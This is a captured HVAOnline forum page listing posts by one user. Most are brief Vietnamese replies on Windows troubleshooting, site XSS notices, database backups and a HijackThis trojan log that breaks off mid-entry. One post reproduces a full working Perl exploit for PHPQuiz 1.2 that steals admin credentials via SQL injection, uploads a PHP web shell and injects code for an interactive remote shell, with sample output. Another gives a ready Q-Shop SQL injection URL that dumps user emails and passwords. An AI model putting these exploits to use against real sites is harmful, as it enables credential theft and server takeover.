<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> 

<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="-1">
<meta name="description" content="HVA discussion board">
<meta name="keywords" content="Messages posted by LeonHart, jforum, jforum java, jforum forum, forum java, java jforum, java forum, forum, rafael steil, bulletin board, java bb, javabb, hva, hvaonline, hvazone, hvaforum">
<meta name="resource-type" content="document">
<meta name="distribution" content="global">
<meta name="robots" content="index,follow">
<meta name="rating" content="general">
<style type="text/css">
<!-- 
@import url( "http://www.hvaonline.net/hvaonline/templates/viet/styles/style.css");
-->
</style>
<style type="text/css">
<!--
@import url("http://www.hvaonline.net/hvaonline/templates/viet/styles/en_US.css");
-->
</style>
<title>Messages posted by LeonHart - .:: HVAOnline ::.</title>

</head>
<body class="en_US">


<!--
Original theme from phpBB (http://www.phpbb.com) subSilver
Created by subBlue design
http://www.subBlue.com
Modifications by JForum Team 
Extended and customised by HVA Team
Added more features and Black Silver theme designed by HVA
-->
<table width="100%" border="0" cols="2">
	<tr align="right">
		<td class="copyright">
			English
			| 
			<a href="/hvaonline/jforum.html?module=forums&amp;action=setLang&amp;lang=vi_VN" rel="nofollow">Vietnamese</a>
		</td>
	</tr>
</table>
<table width="100%" border="0">
	<tr>
		<td>
			<table cellspacing="0" cellpadding="0" width="100%" border="0">
				<tr>			
        <td>&nbsp;
			</td>
		
        <td width="100%" align="center" valign="middle">
						<p><a href="http://www.hvaonline.net" title="[Logo]">
								<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/hvabanner-final.gif" alt="banner" />
							<br>
            				</a><span class="maintitle"></span>
						</p>
          <table cellspacing="0" cellpadding="2" border="0">
							<tr>
								
              <td valign="top" nowrap="nowrap" align="center">
			  						<a href="/hvaonline/forums/rule.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_rule.gif" alt="[Rule]" title="[Rule]"></a>
									<a id="rule" class="topmenu" href="/hvaonline/forums/rule.html">Rules</a>&nbsp;
									
									<a class="topmenu" href="/hvaonline/forums/list.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_groups.gif" alt="[Home]" title="[Home]"></a>
										<a id="backtosite" class="topmenu" href="/hvaonline/forums/list.html">Main Forum</a>&nbsp;

										<a class="topmenu" href="/hvaonline/portal/list.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_portal.gif" alt="[Portal]" title="[Portal]"></a>
										<a id="portalsite" class="topmenu" href="/hvaonline/portal/list.html">Portal</a>&nbsp;&nbsp;
									<br>
									
										<a href="/hvaonline/user/list.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_members.gif" alt="[Members]" title="[Members]"></a>
										<a id="users" class="topmenu" href="/hvaonline/user/list.html">Member Listing</a>&nbsp;
										
										<a href="/hvaonline/forums/stats.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_stats.gif" alt="[Statistics]" title="[Statistics]"></a>
										<a id="stats" class="topmenu" href="/hvaonline/forums/stats.html">Statistics</a>&nbsp;
										
										<a href="/hvaonline/search/filters.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_search.gif" alt="[Search]" title="[Search]"></a>
										<span class="mainmenu"><a id="search" class="topmenu" href="/hvaonline/search/filters.html"><b>Search</b></a>&nbsp;
									
										<a href="/book/"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_book.gif" alt="[Reading Room]" title="[Reading Room]"></a> 
										<a class="topmenu" href="/hvaonline/readingRoom/list.html">Reading Room</a>&nbsp;

									
									<span class="topmenu"> 
										

	
										<br>
											<a id="register" class="topmenu" href="/hvaonline/user/insert.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_register.gif" border="0" alt="[Register]" title="[Register]"> 
												Register</a>&nbsp;&nbsp;</span>
											<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_login.gif" border="0" alt="[Login]" title="[Login]"> 
											<strong>Login</strong> [&nbsp;
											<a id="login" class="topmenu" href="/hvaonline/user/login.html">http</a>&nbsp;
											|
											<a id="logins" class="topmenu" href="https://www.hvaonline.net/hvaonline/user/logins.html">https </a>&nbsp;]</span>
								</td>
							</tr>
							<tr>
								<td>&nbsp;</td>
							</tr>
						</table>
					</td>
				</tr>
			</table>
		</td>
	</tr>
	<tr>
		<td>

<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/post_show.js"></script>
<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/post.js"></script>
<script type="text/javascript">
<!--

function showEmail(beforeAt, afterAt)
{
	return beforeAt + "@" + afterAt;
}

var starOn=new Image();
starOn.src="http://www.hvaonline.net/hvaonline/templates/viet/images/star_on.gif";

var starOff=new Image();
starOff.src="http://www.hvaonline.net/hvaonline/templates/viet/images/star_off.gif";

function writeStars(q, postId)
{
	for (var i = 0; i < 5; i++) {
		var name = "star" + postId + "_" + i;
		document.write("<img name='" + name + "' alt='*' />");
		document.images[name].src = q > i ? starOn.src : starOff.src;
	}
}

function addBookmark(relationType, relationId)
{
	var w = window.open('/hvaonline/bookmarks/insert/' + relationType + '/' + relationId + '.html', 'bookmark_add', 'width="700", height="100", scrollbars="no"');
	w.focus();
}

function supportAjax()
{
	if (typeof(AjaxUtils) != 'undefined') {
		if (window.ActiveXObject) {
			var r = new ActiveXObject("Microsoft.XMLHTTP");
			return r != undefined;
		}
		else if (window.XMLHttpRequest) {
			return true;
		}
	}

	return false;
}

-->
</script>

<table cellspacing="0" cellpadding="10" width="98%" align="center" border="0">
	<tr>
		<td class="bodyline">
			<table cellspacing="2" cellpadding="2" width="100%" border="0">
				<tr>
					<td valign="middle" align="left" colspan="2">
						<span class="maintitle"><a href="/hvaonline/posts/listByUser/6383.html" name="top" class="maintitle" id="top">Messages posted by: LeonHart</a></span>
						&nbsp;<a href="/hvaonline/rss/showPostsByUser/6383.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/xml_button.gif" border="0" alt="XML" /></a>
					</td>
				</tr>
			</table>
			
			<table cellspacing="2" cellpadding="2" width="100%" border="0">
				<tr>
					
					<td valign="middle" align="left" colspan="0">
						<span class="nav">
						<a href="/hvaonline/user/profile/6383.html">Profile for LeonHart</a> 
            			<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif"><a href="/hvaonline/posts/listByUser/6383.html">Messages posted by LeonHart</a>
						</span>
					</td>
										
					<td valign="middle" align="right">
						<span class="nav">[ number of posts not being displayed on this page: <span class="moderator">10</span> ]</span>
					</td>
				</tr>
			</table>

			
      <table class="forumline" cellspacing="1" cellpadding="3" width="100%" border="0">
        <tr>
          <th height="26" nowrap="nowrap" class="thleft">&nbsp;</th>
        </tr>

				
        <!-- POST LISTING -->
         
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/23.html">Thảo luận hệ điều hành Windows</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/13918.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/13918/83148.html#83148,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Theo microsoft:<br/> <font color='red'><i>Group Policy processing does not work and events 1030 and 1058 are logged in the Application log of a domain controller</i></font><br/><br/> Full info:<span class="link"> http://support.microsoft.com/kb/842804</span><br/> Thân<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/6.html">Kiểm tra bảo mật</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/9938.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/9938/60033.html#60033,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Đúng như anh conmale, site bạn dính XSS nhiều quá, cái phần "Nhật Ký" bị khá nhiều, vui lòng check kỹ lại code.<br/> Thân</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/6.html">Kiểm tra bảo mật</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/10361.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/10361/60031.html#60031,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Check và PM<br/> Thân</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/6.html">Kiểm tra bảo mật</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/6142.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/6142/37335.html#37335,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Không hiểu sao server này mở rất nhiều port thế?<br/> Thông tin lỗi tôi sẽ PM bạn.<br/> Thân</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/23.html">Thảo luận hệ điều hành Windows</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/4531.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/4531/28233.html#28233,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Nếu db dung lượng ít thì dùng tool của forum hoặc phpmyadmin backup, còn nếu lớn hơn khoản 100MB thì tốt nhất dùng SSH. Bạn nên hỏi host có hỗ trợ SSH hay không.</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/13.html">Thông tin new bugs và exploits</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/4101.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/4101/24204.html#24204,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody"><span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>######################################################
#
# Title: PHPQuiz &lt;= v.1.2 Remote SQL injection/Code Execution Exploit
# Vendor : PHPQuiz
# webiste :<span class="link"> http://www.phpquiz.com</span>
# Version : &lt;= v.1.2
# Severity: Critical
# Author: Simo64 / simo64_at_morx_org
# MorX Security Reseach Team
#<span class="link"> http://www.morx.org</span>
#<span class="link"> http://www.morx.org/phpquiz.txt</span>
#
# Details :
#
# SQL injection in score.php
#***************************
#
# univers var in score.php and quiz_id var in home.php are not proprely verified and can be used to inject query
#
# PoC :<span class="link"> http://localhost/phpquiz/front/?what=score&univers=&#91;SQL&#93;</span>
# <span class="link"> http://localhost/phpquiz/front/?quiz=quiz&univers=1&step=1&quiz_id=&#91;SQL&#93;</span>
#
# Arbitary File Upload
#**********************
# vulnerable code in back/upload_img.php and admin/upload_img.php near lines 74-76
#
# 74 if &#40;&#40;$upload&#41; && &#40;$ok_update == "yes"&#41;&#41; {
# 75
# 76 if&#40;@copy&#40;$image, $path&#41;&#41;{
# 77 .....
#
# $upload , $ok_update , $image , $path variables are not sanitized and can be used to upload files
#
# PoC Exploit :
#
# &lt;form enctype="multipart/form-data" method="post" action="http://localhost/phpquiz/back/upload_img.php?upload=1&ok_update=yes&path=./../img_quiz/l3ez.php"&gt;
# Download File&lt;br&gt;
# &lt;input name="image" type="file" size="20"&gt;&lt;br&gt;
# &lt;input type="submit" name="upload" value="Upload"&gt;&lt;form&gt;
#
# phpquiz/img_quiz/ folder is by defaut writable so after uploading a simple phpshell &lt;?passthru&#40;$cmd&#41;;?&gt;
#
# we can lanche cmd from :<span class="link"> http://localhost/phpquiz/img_quiz/l3ez.php?cmd=ls</span>
#
# PHP Code Injection
#********************
#
# cfgphpquiz/install.php is accessible without authentification , the script is used to
# save configuration setting in config.inc.php.
#
# Impact:
# any remote user can post php code to the vulnerable file, view current configuration which contains sensitive information # such as admin password &#40;plain text&#41; and login
#
#***********************************************************************************
#
# simo64@localhost:~$ phpquiz.pl morx.org /phpquiz/ 1
#
# /-----------------------------------------------------------
# | PHPQuiz v.1.2 Remote SQL injection/Code Execution Exploit |
# | Coded by simo64 - simo64_morx.org |
# | www.morx.org |
# |-----------------------------------------------------------|
# | MorX Security Research Team © |
# -----------------------------------------------------------/
#
# Connecting to www.morx.org ... Connected !
#
# &#91;+&#93; Injecting credentials
#
# Sending Data ...
#
# SQL injection Succeded !
#
# User EMail : &lt;a href="mailto:admin@morx.org"&gt;admin@morx.org&lt;/a&gt;
# User Login : admin
# User Passwd : password
#
# &#91;+&#93; Exec CMD by uploading a shell Connected !
#
# Uploading shell ... &#91;OK&#93;
#
# Checking if successfully Uploaded .... &#91;OK&#93;
#
# NOW YOU CAN LAUNCH COMMANDS
#
# simo64&#91;at&#93;morx.org :~$ id
# uid=48&#40;apache&#41; gid=48&#40;apache&#41; groups=48&#40;apache&#41;,2522&#40;psaserv&#41;
# simo64&#91;at&#93;morx.org :~$ pwd
# /home/morx/public_html/phpquiz/img_quiz
# simo64&#91;at&#93;morx.org :~$ ls
# id_1.gif
# id_2.gif
# id_3.gif
# id_4.gif
# index.php
# zaz.php
# simo64&#91;at&#93;morx.org :~$ exit
#
#!/usr/bin/perl
use IO::Socket ;
use LWP::Simple ;
print q&#40;
/-----------------------------------------------------------
| PHPQuiz v.1.2 Remote SQL injection/Code Execution Exploit |
| Coded by simo64 - simo64_morx.org |
| www.morx.org |
|-----------------------------------------------------------|
| MorX Security Research Team © |
-----------------------------------------------------------/
&#41;;
sub usage&#40;&#41;{
print "nUsage :perl $0 siteurl /path/ useridn";
print "nExemple : perl $0 phpquiz.com /phpquiz/ 1n";
}
if&#40;!@ARGV&#41;{
&usage&#40;&#41;;
exit&#40;0&#41;
}
$host = $ARGV&#91;0&#93;;
$path = $ARGV&#91;1&#93;;
$uid = $ARGV&#91;2&#93;;
$success = null ;
$injected = 0;
$injcheck = $path."cfgphpquiz/config.inc.php?xD=l3fou";
$phpinject = $path."cfgphpquiz/install.php?submit=Valider&config_alert_email_name=%22;echo%20@$xD;@system&#40;$morx&#41;;//MorX%20RulZ%20=&#41;";
$injectuser = "front/?what=score&univers=-64%20UNION%20SELECT%20null,LOGIN,null,null,null,null,null,null,null,null%20FROM%20user%20WHERE%20ID=$uid/*";
$injectpass = "front/?what=score&univers=-64%20UNION%20SELECT%20null,PWD,null,null,null,null,null,null,null,null%20FROM%20user%20WHERE%20ID=$uid/*";
$injectmail = "front/?what=score&univers=-64%20UNION%20SELECT%20null,EMAIL,null,null,null,null,null,null,null,null%20FROM%20user%20WHERE%20ID=$uid/*";
syswrite STDOUT , "Connecting to $host ...";
my $sock = new IO::Socket::INET &#40; PeerAddr =&gt; "$host",PeerPort =&gt; "80",Proto =&gt; "tcp",&#41;;
die "nnUnable to connect to $host " unless&#40;$sock&#41; ;
syswrite STDOUT , "tConnected !nn&#91;+&#93; Injecting credentialsnnSending Data ...";
print $sock "GET $path$injectmail HTTP/1.1n";
print $sock "Host: $hostn";
print $sock "Connection: Closenn";
while&#40;$res = &lt;$sock&gt;&#41;{
if&#40;$res =~ /anim_fleche_droite.gif" border="0"&gt;&nbsp;&quot;&#40;.*?&#41;&quot;&lt;/a&gt;/&#41;{
$usermail = $1 ;
$success = "ok" ;
}
}
if&#40;$success eq "ok"&#41; {
syswrite STDOUT , "nnSQL injection Succeded !nn";
sleep 2 ;
syswrite STDOUT , "tUser EMail : $usermailn";
my $sock = new IO::Socket::INET &#40; PeerAddr =&gt; "$host",PeerPort =&gt; "80",Proto =&gt; "tcp",&#41;;
print $sock "GET $path$injectuser HTTP/1.1n";
print $sock "Host: $hostn";
print $sock "Connection: Closenn";
while&#40;$res = &lt;$sock&gt;&#41;{
if&#40;$res =~ /&gt;&nbsp;&quot;&#40;.*?&#41;&quot;/&#41;{
$userlogin = $1 ;
}
}
syswrite STDOUT , "tUser Login : $userloginn";
my $sock = new IO::Socket::INET &#40; PeerAddr =&gt; "$host",PeerPort =&gt; "80",Proto =&gt; "tcp",&#41;;
print $sock "GET $path$injectpass HTTP/1.1n";
print $sock "Host: $hostn";
print $sock "Connection: Closenn";
while&#40;$res = &lt;$sock&gt;&#41;{
if&#40;$res =~ /&gt;&nbsp;&quot;&#40;.*?&#41;&quot;/&#41;{
$userpass = $1 ;
}
}
syswrite STDOUT , "tUser Passwd : $userpassnn";
} else {print "nnInjecting credentials Exploit Failed !nn";}
sleep 2;
# PART2 Remote Command Execution by uploaing shell
syswrite STDOUT , "n&#91;+&#93; Exec CMD by uploading a shell";
my $sock = new IO::Socket::INET &#40; PeerAddr =&gt; "$host",PeerPort =&gt; "80",Proto =&gt; "tcp",&#41;;
die "nnUnable to connect to $host " unless&#40;$sock&#41; ;
syswrite STDOUT , "tConnected !nn";
syswrite STDOUT , "Uploading shell ...";
$data='-----------------------------7d61592213049c
Content-Disposition: form-data; name="dir"
/
-----------------------------7d61592213049c
Content-Disposition: form-data; name="image"; filename="zaz.php"
Content-Type: text/plain
&lt;?php
if &#40;get_magic_quotes_gpc&#40;&#41;&#41;{$_GET&#91;'cmd'&#93;=stripslashes&#40;$_GET&#91;'cmd'&#93;&#41;;}
passthru&#40;$_GET&#91;'cmd'&#93;&#41;;
?&gt;
-----------------------------7d61592213049c
Content-Disposition: form-data; name="submit"
Upload
-----------------------------7d61592213049c--
';
$script = $path."/back/upload_img.php?upload=1&ok_update=yes&path=./../img_quiz/zaz.php";
$len = length $data ;
print $sock "POST $script HTTP/1.0rn";
print $sock "Content-Type: multipart/form-data; boundary=---------------------------7d61592213049crn";
print $sock "Host: $hostrn";
print $sock "Content-Length: $lenrn";
print $sock "Connection: closernrn";
print $sock $data;
syswrite STDOUT , "t&#91;OK&#93;nnChecking if successfully Uploaded .... ";
my $sock = new IO::Socket::INET &#40; PeerAddr =&gt; "$host",PeerPort =&gt; "80",Proto =&gt; "tcp",&#41;;
print $sock "HEAD $path"."img_quiz/zaz.php HTTP/1.0rn";
print $sock "Host: $hostrn";
print $sock "Connection: closenn";
while&#40;$rep = &lt;$sock&gt;&#41;{
if&#40;$rep =~ /HTTP/1.1 200 OK/&#41; { $success = 1; }
}
if&#40;$success == 1&#41;{
print "t&#91;OK&#93;nnttNOW YOU CAN LAUNCH COMMANDSnn";
while&#40;&#41;{
print "simo64&#91;at&#93;morx.org :~$ ";
chop&#40;$cmd=&lt;STDIN&gt;&#41;;
exit&#40;&#41; if &#40;$cmd eq 'exit'&#41;;
$result = get&#40;"http://$host".$path."img_quiz/zaz.php?cmd=$cmd"&#41;;
print $result;
}
}
else { print "tFailed !nnFile Upload Failednn" }
# STEP 3 Injecting PHPcode into config.inc.php file
print "n&#91;+&#93; Injecting PHP Code......nnConnecting ....";
my $sock = new IO::Socket::INET &#40;PeerAddr =&gt; "$host",PeerPort =&gt; "80",Proto =&gt; "tcp",&#41;;
die "Connot Connect to $host !" unless&#40;$sock&#41;;
print "tConnected !nnSending Data ....t";
print $sock "GET $phpinject HTTP/1.1n";
print $sock "Host: $hostn";
print $sock "Content-Type: application/x-www-form-urlencodedn";
print $sock "User-Agent: MorX-Zillan";
print $sock "Connection: Closenn";
print "t OKnnChecking if code injected ...";
my $sock = new IO::Socket::INET &#40;PeerAddr =&gt; "$host",PeerPort =&gt; "80",Proto =&gt; "tcp",&#41;;
print $sock "GET $injcheck HTTP/1.1n";
print $sock "Host: $hostn";
print $sock "Content-Type: application/x-www-form-urlencodedn";
print $sock "User-Agent: MorX-Zillan";
print $sock "Connection: Closenn";
while&#40;$check = &lt;$sock&gt;&#41;{
if&#40;$check =~ /l3fou/&#41; { $injected = 1; }
}
if&#40;$injected == 1 &#41;{
print "tSucceded !nntNOW YOU ARE IN !nn";
while&#40;&#41;{
print "simo@morx.org :~$ ";
$cmd = &lt;STDIN&gt;;
chop&#40;$cmd&#41;;
exit&#40;0&#41; if&#40;$cmd eq "exit"&#41;;
$result = get&#40;"http://".$host.$path."cfgphpquiz/config.inc.php?morx=$cmd"&#41;;
print $result;
}
}
else {print "tFailednnPHPCode Injection Failed !nn";}
#</pre>
</div></span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/13.html">Thông tin new bugs và exploits</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/4100.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/4100/24203.html#24203,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><blockquote>*************************************************************<br/> # Title : Q-Shop v3.5(browse.asp) Remote SQL Injection Vulnerability<br/><br/> # Author : ajann<br/><br/> # Script Page :<span class="link"> http://quadcomm.com</span><br/><br/> # Exploit;<br/><br/> *************************************************************<br/><br/> ###http://[target]/[path]/browse.asp?cat=42&ManuID=&OrderBy=[SQL HERE]<br/><br/> Example:<br/> browse.asp?cat=42&ManuID=&OrderBy=1%20union%20select%200,mail,0,pwd,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20from%20users<br/><br/> # ajann,Turkey<br/> # ...&nbsp;
</blockquote></span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/23.html">Thảo luận hệ điều hành Windows</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/3950.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/3950/23947.html#23947,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Lần sao tìm kiếm kỹ trước khi hỏi<br/> Thân</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/23.html">Thảo luận hệ điều hành Windows</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/4044.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/4044/23945.html#23945,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Máy của cậu có cài Visual Basic ko?</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/23.html">Thảo luận hệ điều hành Windows</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/3665.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/3665/22055.html#22055,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Tôi nhớ cái thông báo error còn khúc sau nữa. Bạn phải có quyền admin mới cài được.</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/28.html">Thảo luận virus, trojan, spyware, worm...</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/3712.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/3712/22052.html#22052,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Có lẽ máy nhiễm trojan <b>Troj/Brave-A</b><br/><br/> Reboot ở Safe Mode và run <span class="link"> http://download.hijackthis.eu/hijackthis_199.zip</span><br/><br/> Kiểm tra những cái này trong HijackThis.<br/> (Lưu ý: Nếu R* không hiện trong Safe Mode, re-run HiJackThis ở chế độ bình thường và xoá nó sau khi bạn xoá những cái sau. Đây là log mà lúc trước máy tôi bị nhiễm)<br/><br/> <font color='orange'><b>R1 - HKCU\Software\Microsoft\Internet Explorer\Main,Search Bar =<span class="link"> http://g.msn.com/0SEENUS/SAOS01</span><br/> R1 - HKCU\Software\Microsoft\Internet Explorer\SearchURL,(Default) = about:blank<br/><br/> O2 - BHO: PynixObj Class - {00000000-DD60-0064-6EC2-6E0100000000} - C:\WINNT\Pynix.dll<br/> O2 - BHO: (no name) - {38D4D5D0-423E-4220-B6F9-30918C2AE4A4} - C:\WINNT\sasetup.dll<br/> O2 - BHO: (no name) - {5C8B2A36-3DB1-42A4-A3CB-D426709BBFEB} - (no file)<br/> O2 - BHO: Cls - {CF021F40-3E14-23A5-CBA2-7173706D1316} - C:\WINNT\System32\spm1316.dll (file missing)<br/> O2 - BHO: Cls - {CF021F40-3E14-23A5-CBA2-717765723548} - C:\WINNT\System32\wer3548.dll<br/><br/> O4 - HKLM\..\Run: [farmmext] C:\WINNT\farmmext.exe<br/> O4 - HKLM\..\Run: 